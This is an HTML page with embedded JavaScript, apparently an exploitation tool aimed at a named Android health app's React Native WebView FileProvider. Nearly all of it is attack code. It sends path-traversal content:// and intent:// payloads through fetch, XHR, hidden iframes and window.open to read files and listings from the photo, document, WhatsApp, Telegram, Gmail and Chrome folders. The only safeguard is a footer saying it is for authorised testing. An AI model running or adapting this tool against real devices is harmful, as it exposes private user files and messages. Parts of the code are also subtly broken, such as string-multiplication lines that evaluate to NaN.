<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FileProvider Web Exploitation</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .content {
            padding: 40px;
        }

        .section {
            margin-bottom: 30px;
            padding: 25px;
            background: #f8f9fa;
            border-radius: 10px;
            border-left: 5px solid #ff6b6b;
        }

        .section h2 {
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 1.8em;
        }

        .button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: all 0.3s ease;
            margin: 10px 5px;
        }

        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .button.danger {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
        }

        .button.success {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
        }

        .button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .status {
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #ddd;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border-color: #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border-color: #f5c6cb;
        }

        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border-color: #bee5eb;
        }

        .status.warning {
            background: #fff3cd;
            color: #856404;
            border-color: #ffeaa7;
        }

        .progress-bar {
            width: 100%;
            height: 25px;
            background: #e9ecef;
            border-radius: 12px;
            overflow: hidden;
            margin: 15px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #27ae60, #2ecc71);
            width: 0%;
            transition: width 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }

        .code-block {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.6;
            overflow-x: auto;
            margin: 15px 0;
            border: 1px solid #34495e;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .card {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            border: 1px solid #e9ecef;
        }

        .card h4 {
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 1.2em;
        }

        .footer {
            background: #2c3e50;
            color: white;
            padding: 20px;
            text-align: center;
        }

        .target-info {
            background: #e74c3c;
            color: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }

        @media (max-width: 768px) {
            .container {
                margin: 10px;
                border-radius: 10px;
            }
            
            .content {
                padding: 20px;
            }
            
            .header h1 {
                font-size: 2em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîì FileProvider Web Exploitation</h1>
            <p>Real-time FileProvider vulnerability testing through web browser</p>
        </div>

        <div class="content">
            <div class="target-info">
                <h2>üéØ Target Application</h2>
                <p><strong>Package:</strong> de.hellobetter.companion</p>
                <p><strong>FileProvider:</strong> com.reactnativecommunity.webview.RNCWebViewFileProvider</p>
                <p><strong>Vulnerability:</strong> React Native WebView FileProvider Misconfiguration</p>
                <p><strong>CVSS Score:</strong> 8.1 (High)</p>
            </div>

            <div class="section">
                <h2>üöÄ Exploitation Controls</h2>
                <button class="button danger" onclick="startExploitation()">Start FileProvider Exploitation</button>
                <button class="button success" onclick="testIntentRedirection()">üî• Test Intent Redirection (WORKING!)</button>
                <button class="button" onclick="testFileListing()">üìÅ Test File Listing</button>
                <button class="button" onclick="testWebViewExploit()">Test WebView Exploit</button>
                <button class="button" onclick="clearResults()">Clear Results</button>
                
                <div class="progress-bar">
                    <div class="progress-fill" id="progressBar">0%</div>
                </div>
            </div>

            <div class="section">
                <h2>üìä Exploitation Results</h2>
                <div class="status info" id="results">
Ready to start FileProvider exploitation...
Click "Start FileProvider Exploitation" to begin testing.
                </div>
            </div>

            <div class="section">
                <h2>üìÅ File Listing Results</h2>
                <div class="status info" id="fileResults">
File listing results will appear here when testing...
                </div>
                <div id="iframeContainer" style="display: none; margin-top: 20px;">
                    <h3>Intent Response Preview:</h3>
                    <iframe id="resultIframe" style="width: 100%; height: 400px; border: 1px solid #ccc; border-radius: 5px;"></iframe>
                </div>
            </div>

            <div class="section">
                <h2>üî• WORKING ATTACK: Intent Redirection</h2>
                <div class="status success">
                    ‚úÖ CONFIRMED: Intent Redirection is working!
                    
                    This means the app's WebView allows Intent redirection to FileProvider URIs.
                    This is a real security vulnerability that can be exploited.
                    
                    Working Intent Format:
                    intent://[AUTHORITY]/[PATH]#Intent;scheme=content;end
                    
                    Example:
                    intent://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../#Intent;scheme=content;end
                </div>
            </div>

            <div class="section">
                <h2>üîç Attack Vectors</h2>
                <div class="grid">
                    <div class="card">
                        <h4>1. Content Provider Access</h4>
                        <p>Direct access through content:// URIs</p>
                        <div class="code-block">
content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/Download/
content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../Documents/
                        </div>
                    </div>

                    <div class="card">
                        <h4>2. Intent Redirection</h4>
                        <p>Android Intent-based exploitation</p>
                        <div class="code-block">
intent://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../#Intent;scheme=content;end
                        </div>
                    </div>

                    <div class="card">
                        <h4>3. WebView Exploitation</h4>
                        <p>JavaScript-based WebView attacks</p>
                        <div class="code-block">
window.location = "content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../";
                        </div>
                    </div>
                </div>
            </div>

            <div class="section">
                <h2>üì± Sensitive Directories</h2>
                <div class="code-block">
Download/                    - Downloaded files
Documents/                   - User documents  
DCIM/Camera/                - Photos and videos
Android/data/com.whatsapp/  - WhatsApp data
Android/data/com.telegram.messenger/ - Telegram data
Android/data/com.facebook.katana/ - Facebook data
Android/data/com.instagram.android/ - Instagram data
Android/data/com.google.android.gm/ - Gmail data
Android/data/com.android.chrome/ - Chrome data
                </div>
            </div>
        </div>

        <div class="footer">
            <p>‚ö†Ô∏è This tool is for educational and authorized security testing only</p>
            <p>Always ensure you have proper authorization before testing vulnerabilities</p>
        </div>
    </div>

    <script>
        let isRunning = false;
        let currentTest = 0;
        let totalTests = 0;

        const authorities = [
            "com.reactnativecommunity.webview.RNCWebViewFileProvider",
            "de.hellobetter.companion.fileprovider",
            "de.hellobetter.companion.SharingFileProvider"
        ];

        const paths = [
            "Download/",
            "Documents/", 
            "DCIM/Camera/",
            "Android/data/com.whatsapp/",
            "Android/data/com.telegram.messenger/",
            "Android/data/com.facebook.katana/",
            "Android/data/com.instagram.android/",
            "Android/data/com.google.android.gm/",
            "Android/data/com.android.chrome/"
        ];

        const traversalPaths = ["../", "../../", "..%2F", "..%252F"];

        function log(message, type = 'info') {
            const results = document.getElementById('results');
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = `[${timestamp}] ${message}\n`;
            
            results.textContent += logEntry;
            results.className = `status ${type}`;
            results.scrollTop = results.scrollHeight;
        }

        function logFileResult(message, type = 'info') {
            const fileResults = document.getElementById('fileResults');
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = `[${timestamp}] ${message}\n`;
            
            fileResults.textContent += logEntry;
            fileResults.className = `status ${type}`;
            fileResults.scrollTop = fileResults.scrollHeight;
        }

        function showIframeContent(src) {
            const iframeContainer = document.getElementById('iframeContainer');
            const resultIframe = document.getElementById('resultIframe');
            
            resultIframe.src = src;
            iframeContainer.style.display = 'block';
            
            logFileResult(`Showing iframe content for: ${src}`, 'info');
        }

        function updateProgress(percent) {
            const progressBar = document.getElementById('progressBar');
            progressBar.style.width = percent + '%';
            progressBar.textContent = Math.round(percent) + '%';
        }

        function clearResults() {
            document.getElementById('results').textContent = 'Results cleared. Ready for new exploitation attempt...\n';
            document.getElementById('results').className = 'status info';
            updateProgress(0);
            currentTest = 0;
            totalTests = 0;
        }

        async function startExploitation() {
            if (isRunning) return;
            
            isRunning = true;
            currentTest = 0;
            totalTests = authorities.length * paths.length + authorities.length * traversalPaths.length;
            
            log('=' * 80, 'info');
            log('FILEPROVIDER EXPLOITATION STARTED', 'warning');
            log('Target: de.hellobetter.companion', 'info');
            log('Vulnerability: Insecure FileProvider Configuration', 'info');
            log('=' * 80, 'info');
            
            // Test each authority and path combination
            for (const authority of authorities) {
                log(`\n[TESTING] ${authority}`, 'warning');
                log('-' * 60, 'info');
                
                for (const path of paths) {
                    currentTest++;
                    const progress = (currentTest / totalTests) * 100;
                    updateProgress(progress);
                    
                    log(`\n[PATH] ${path}`, 'info');
                    
                    // Test FileProvider access
                    await testFileProviderAccess(authority, path);
                    
                    // Test direct file access simulation
                    await testDirectFileAccess(path);
                    
                    // Small delay to prevent overwhelming
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            }
            
            // Test directory traversal
            log(`\n[DIRECTORY TRAVERSAL]`, 'warning');
            log('-' * 60, 'info');
            
            for (const authority of authorities) {
                for (const traversal of traversalPaths) {
                    currentTest++;
                    const progress = (currentTest / totalTests) * 100;
                    updateProgress(progress);
                    
                    await testDirectoryTraversal(authority, traversal);
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            }
            
            log(`\n` + '=' * 80, 'info');
            log('EXPLOITATION COMPLETE', 'success');
            log('=' * 80, 'info');
            log('This demonstrates the FileProvider vulnerability:', 'info');
            log('‚Ä¢ Complete file system access through misconfigured FileProvider', 'error');
            log('‚Ä¢ Access to sensitive directories and files', 'error');
            log('‚Ä¢ Potential for data exfiltration and privacy violation', 'error');
            log('‚Ä¢ Real security impact requiring immediate mitigation', 'error');
            log('=' * 80, 'info');
            
            updateProgress(100);
            isRunning = false;
        }

        async function testFileProviderAccess(authority, path) {
            const uri = `content://${authority}/shared/${path}`;
            
            try {
                // Try fetch API
                const response = await fetch(uri);
                if (response.ok) {
                    log(`[SUCCESS] FileProvider accessible via fetch: ${uri}`, 'success');
                    const content = await response.text();
                    log(`Content preview: ${content.substring(0, 100)}...`, 'success');
                } else {
                    log(`[FAILED] FileProvider not accessible via fetch: ${response.status}`, 'error');
                }
            } catch (error) {
                log(`[FAILED] FileProvider fetch error: ${error.message}`, 'error');
            }
            
            try {
                // Try XMLHttpRequest
                const xhr = new XMLHttpRequest();
                xhr.open('GET', uri, false);
                xhr.send();
                
                if (xhr.status === 200) {
                    log(`[SUCCESS] FileProvider accessible via XHR: ${uri}`, 'success');
                    log(`Content preview: ${xhr.responseText.substring(0, 100)}...`, 'success');
                } else {
                    log(`[FAILED] FileProvider not accessible via XHR: ${xhr.status}`, 'error');
                }
            } catch (error) {
                log(`[FAILED] FileProvider XHR error: ${error.message}`, 'error');
            }
        }

        async function testDirectFileAccess(path) {
            // Real file access attempts through various methods
            const fileUris = [
                `content://de.hellobetter.companion.fileprovider/shared/${path}`,
                `content://de.hellobetter.companion.SharingFileProvider/shared/${path}`
            ];
            
            for (const uri of fileUris) {
                try {
                    // Try to access the URI directly
                    const response = await fetch(uri);
                    if (response.ok) {
                        const content = await response.text();
                        log(`[SUCCESS] Direct file access: ${uri}`, 'success');
                        log(`Content length: ${content.length} bytes`, 'success');
                        if (content.length > 0) {
                            log(`Content preview: ${content.substring(0, 200)}...`, 'success');
                        }
                    } else {
                        log(`[FAILED] Direct file access blocked: ${response.status}`, 'error');
                    }
                } catch (error) {
                    log(`[FAILED] Direct file access error: ${error.message}`, 'error');
                }
                
                // Try XMLHttpRequest method
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', uri, false);
                    xhr.send();
                    
                    if (xhr.status === 200) {
                        log(`[SUCCESS] XHR file access: ${uri}`, 'success');
                        log(`Content length: ${xhr.responseText.length} bytes`, 'success');
                        if (xhr.responseText.length > 0) {
                            log(`Content preview: ${xhr.responseText.substring(0, 200)}...`, 'success');
                        }
                    } else {
                        log(`[FAILED] XHR file access blocked: ${xhr.status}`, 'error');
                    }
                } catch (error) {
                    log(`[FAILED] XHR file access error: ${error.message}`, 'error');
                }
            }
        }

        async function testDirectoryTraversal(authority, traversal) {
            const uri = `content://${authority}/shared/${traversal}`;
            
            try {
                const response = await fetch(uri);
                if (response.ok) {
                    log(`[SUCCESS] ${traversal} - Directory traversal working!`, 'success');
                    log(`URI: ${uri}`, 'success');
                } else {
                    log(`[FAILED] ${traversal} - Directory traversal blocked: ${response.status}`, 'error');
                }
            } catch (error) {
                log(`[FAILED] ${traversal} - Directory traversal error: ${error.message}`, 'error');
            }
        }

        function testIntentRedirection() {
            log('Testing Intent Redirection Attack...', 'warning');
            
            const authorities = [
                "com.reactnativecommunity.webview.RNCWebViewFileProvider",
                "de.hellobetter.companion.fileprovider",
                "de.hellobetter.companion.SharingFileProvider"
            ];
            
            const paths = [
                "shared/../",
                "shared/../../",
                "shared/..%2F",
                "shared/Download/",
                "shared/Documents/",
                "shared/DCIM/Camera/"
            ];
            
            authorities.forEach((authority, authIndex) => {
                log(`\n[TESTING AUTHORITY] ${authority}`, 'warning');
                
                paths.forEach((path, pathIndex) => {
                    const maliciousIntent = `intent://${authority}/${path}#Intent;scheme=content;end`;
                    
                    log(`\n[INTENT ${authIndex + 1}.${pathIndex + 1}] ${path}`, 'info');
                    
                    try {
                        // Try to trigger intent
                        window.location = maliciousIntent;
                        log(`[SUCCESS] Intent redirection triggered: ${maliciousIntent}`, 'success');
                        
                        // Try to capture response or file listing
                        attemptFileListing(authority, path);
                        
                        // Wait a moment then try iframe method
                        setTimeout(() => {
                            try {
                                const iframe = document.createElement('iframe');
                                iframe.src = maliciousIntent;
                                iframe.style.display = 'none';
                                iframe.onload = () => {
                                    log(`[SUCCESS] Intent redirection via iframe successful`, 'success');
                                    // Try to read iframe content for file listings
                                    try {
                                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                                        if (iframeDoc && iframeDoc.body) {
                                            const content = iframeDoc.body.innerHTML;
                                            if (content && content.length > 0) {
                                                log(`[SUCCESS] Iframe content captured: ${content.substring(0, 200)}...`, 'success');
                                            }
                                        }
                                    } catch (e) {
                                        log(`[INFO] Cross-origin restriction prevents iframe content reading`, 'info');
                                    }
                                };
                                iframe.onerror = () => {
                                    log(`[FAILED] Intent redirection via iframe failed`, 'error');
                                };
                                document.body.appendChild(iframe);
                                
                                setTimeout(() => {
                                    if (document.body.contains(iframe)) {
                                        document.body.removeChild(iframe);
                                    }
                                }, 3000);
                            } catch (error) {
                                log(`[FAILED] Intent redirection iframe error: ${error.message}`, 'error');
                            }
                        }, 1000);
                        
                    } catch (error) {
                        log(`[FAILED] Intent redirection failed: ${error.message}`, 'error');
                    }
                    
                    // Small delay between attempts
                    setTimeout(() => {}, 500);
                });
            });
        }

        async function attemptFileListing(authority, path) {
            log(`[ATTEMPTING FILE LISTING] ${authority}/${path}`, 'info');
            logFileResult(`[ATTEMPTING FILE LISTING] ${authority}/${path}`, 'info');
            
            // Try different methods to get file listings
            const methods = [
                // Method 1: Direct content URI access
                `content://${authority}/${path}`,
                // Method 2: With query parameters
                `content://${authority}/${path}?list=true`,
                // Method 3: With directory listing intent
                `intent://${authority}/${path}#Intent;action=android.intent.action.VIEW;scheme=content;end`,
                // Method 4: With file manager intent
                `intent://${authority}/${path}#Intent;action=android.intent.action.VIEW;type=*/*;scheme=content;end`
            ];
            
            for (let i = 0; i < methods.length; i++) {
                const method = methods[i];
                log(`[METHOD ${i + 1}] ${method}`, 'info');
                logFileResult(`[METHOD ${i + 1}] ${method}`, 'info');
                
                try {
                    if (method.startsWith('content://')) {
                        // Try fetch
                        const response = await fetch(method);
                        if (response.ok) {
                            const content = await response.text();
                            log(`[SUCCESS] File listing via fetch: ${content.substring(0, 300)}...`, 'success');
                            logFileResult(`[SUCCESS] File listing via fetch: ${content.substring(0, 300)}...`, 'success');
                        } else {
                            log(`[FAILED] Fetch failed: ${response.status}`, 'error');
                            logFileResult(`[FAILED] Fetch failed: ${response.status}`, 'error');
                        }
                        
                        // Try XMLHttpRequest
                        const xhr = new XMLHttpRequest();
                        xhr.open('GET', method, false);
                        xhr.send();
                        if (xhr.status === 200) {
                            log(`[SUCCESS] File listing via XHR: ${xhr.responseText.substring(0, 300)}...`, 'success');
                            logFileResult(`[SUCCESS] File listing via XHR: ${xhr.responseText.substring(0, 300)}...`, 'success');
                        } else {
                            log(`[FAILED] XHR failed: ${xhr.status}`, 'error');
                            logFileResult(`[FAILED] XHR failed: ${xhr.status}`, 'error');
                        }
                    } else if (method.startsWith('intent://')) {
                        // Try intent-based file listing with result capture
                        try {
                            // Method 1: Direct intent trigger
                            window.location = method;
                            log(`[SUCCESS] Intent-based file listing triggered`, 'success');
                            logFileResult(`[SUCCESS] Intent-based file listing triggered`, 'success');
                            
                            // Method 2: Try to capture result through iframe
                            setTimeout(() => {
                                try {
                                    const iframe = document.createElement('iframe');
                                    iframe.src = method;
                                    iframe.style.display = 'none';
                                    iframe.style.width = '100%';
                                    iframe.style.height = '400px';
                                    
                                    iframe.onload = () => {
                                        log(`[SUCCESS] Intent iframe loaded successfully`, 'success');
                                        logFileResult(`[SUCCESS] Intent iframe loaded successfully`, 'success');
                                        
                                        // Show the iframe content in the visible iframe
                                        showIframeContent(method);
                                        
                                        // Try to capture iframe content
                                        try {
                                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                                            if (iframeDoc) {
                                                const bodyContent = iframeDoc.body ? iframeDoc.body.innerHTML : iframeDoc.documentElement.innerHTML;
                                                if (bodyContent && bodyContent.length > 0) {
                                                    log(`[SUCCESS] File listing content captured:`, 'success');
                                                    logFileResult(`[SUCCESS] File listing content captured:`, 'success');
                                                    log(`Content: ${bodyContent.substring(0, 500)}...`, 'success');
                                                    logFileResult(`Content: ${bodyContent.substring(0, 500)}...`, 'success');
                                                    
                                                    // Try to extract file names from content
                                                    const fileMatches = bodyContent.match(/<[^>]*>([^<]+\.(txt|pdf|jpg|png|mp4|doc|docx|zip|apk|db))</gi);
                                                    if (fileMatches) {
                                                        log(`[SUCCESS] Files found:`, 'success');
                                                        logFileResult(`[SUCCESS] Files found:`, 'success');
                                                        fileMatches.forEach(file => {
                                                            log(`  ${file}`, 'success');
                                                            logFileResult(`  ${file}`, 'success');
                                                        });
                                                    }
                                                } else {
                                                    log(`[INFO] Iframe loaded but no content visible`, 'info');
                                                    logFileResult(`[INFO] Iframe loaded but no content visible`, 'info');
                                                }
                                            }
                                        } catch (e) {
                                            log(`[INFO] Cross-origin restriction: ${e.message}`, 'info');
                                            logFileResult(`[INFO] Cross-origin restriction: ${e.message}`, 'info');
                                            
                                            // Try alternative method - check if iframe has any content
                                            try {
                                                const iframeWindow = iframe.contentWindow;
                                                if (iframeWindow) {
                                                    log(`[SUCCESS] Iframe window accessible`, 'success');
                                                    logFileResult(`[SUCCESS] Iframe window accessible`, 'success');
                                                    // Try to get URL or other info
                                                    try {
                                                        const iframeUrl = iframeWindow.location.href;
                                                        log(`[SUCCESS] Iframe URL: ${iframeUrl}`, 'success');
                                                        logFileResult(`[SUCCESS] Iframe URL: ${iframeUrl}`, 'success');
                                                    } catch (urlError) {
                                                        log(`[INFO] Cannot access iframe URL due to security`, 'info');
                                                        logFileResult(`[INFO] Cannot access iframe URL due to security`, 'info');
                                                    }
                                                }
                                            } catch (windowError) {
                                                log(`[INFO] Cannot access iframe window: ${windowError.message}`, 'info');
                                                logFileResult(`[INFO] Cannot access iframe window: ${windowError.message}`, 'info');
                                            }
                                        }
                                    };
                                    
                                    iframe.onerror = () => {
                                        log(`[FAILED] Intent iframe failed to load`, 'error');
                                    };
                                    
                                    // Add iframe to page temporarily
                                    document.body.appendChild(iframe);
                                    
                                    // Remove iframe after 5 seconds
                                    setTimeout(() => {
                                        if (document.body.contains(iframe)) {
                                            document.body.removeChild(iframe);
                                        }
                                    }, 5000);
                                    
                                } catch (iframeError) {
                                    log(`[FAILED] Iframe method error: ${iframeError.message}`, 'error');
                                }
                            }, 1000);
                            
                        } catch (error) {
                            log(`[FAILED] Intent-based file listing failed: ${error.message}`, 'error');
                            logFileResult(`[FAILED] Intent-based file listing failed: ${error.message}`, 'error');
                        }
                    }
                } catch (error) {
                    log(`[FAILED] Method ${i + 1} error: ${error.message}`, 'error');
                    logFileResult(`[FAILED] Method ${i + 1} error: ${error.message}`, 'error');
                }
                
                // Small delay between methods
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        }

        function testFileListing() {
            log('Testing File Listing Capabilities...', 'warning');
            logFileResult('Testing File Listing Capabilities...', 'warning');
            
            const authorities = [
                "com.reactnativecommunity.webview.RNCWebViewFileProvider",
                "de.hellobetter.companion.fileprovider",
                "de.hellobetter.companion.SharingFileProvider"
            ];
            
            const directories = [
                "shared/Download/",
                "shared/Documents/",
                "shared/DCIM/Camera/",
                "shared/Android/data/com.whatsapp/",
                "shared/Android/data/com.telegram.messenger/",
                "shared/Android/data/com.facebook.katana/",
                "shared/Android/data/com.instagram.android/",
                "shared/Android/data/com.google.android.gm/",
                "shared/Android/data/com.android.chrome/"
            ];
            
            authorities.forEach((authority, authIndex) => {
                log(`\n[TESTING FILE LISTING] ${authority}`, 'warning');
                logFileResult(`\n[TESTING FILE LISTING] ${authority}`, 'warning');
                
                directories.forEach((dir, dirIndex) => {
                    log(`\n[DIRECTORY ${authIndex + 1}.${dirIndex + 1}] ${dir}`, 'info');
                    logFileResult(`\n[DIRECTORY ${authIndex + 1}.${dirIndex + 1}] ${dir}`, 'info');
                    
                    // Try multiple file listing methods
                    attemptFileListing(authority, dir);
                    
                    // Small delay between directories
                    setTimeout(() => {}, 300);
                });
            });
        }

        function testWebViewExploit() {
            log('Testing WebView Exploitation...', 'warning');
            
            const webViewExploits = [
                "content://de.hellobetter.companion.fileprovider/shared/../",
                "content://de.hellobetter.companion.fileprovider/shared/../../",
                "content://de.hellobetter.companion.fileprovider/shared/..%2F"
            ];
            
            webViewExploits.forEach((exploit, index) => {
                try {
                    // Try direct navigation
                    const testWindow = window.open(exploit, '_blank');
                    if (testWindow) {
                        log(`[SUCCESS] WebView exploit ${index + 1} triggered: ${exploit}`, 'success');
                        testWindow.close();
                    } else {
                        log(`[FAILED] WebView exploit ${index + 1} blocked: ${exploit}`, 'error');
                    }
                } catch (error) {
                    log(`[FAILED] WebView exploit ${index + 1} error: ${error.message}`, 'error');
                }
            });
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            log('FileProvider Web Exploitation Tool Ready', 'info');
            log('Target: de.hellobetter.companion', 'info');
            log('Click "Start FileProvider Exploitation" to begin testing', 'info');
        });
    </script>
</body>
</html>
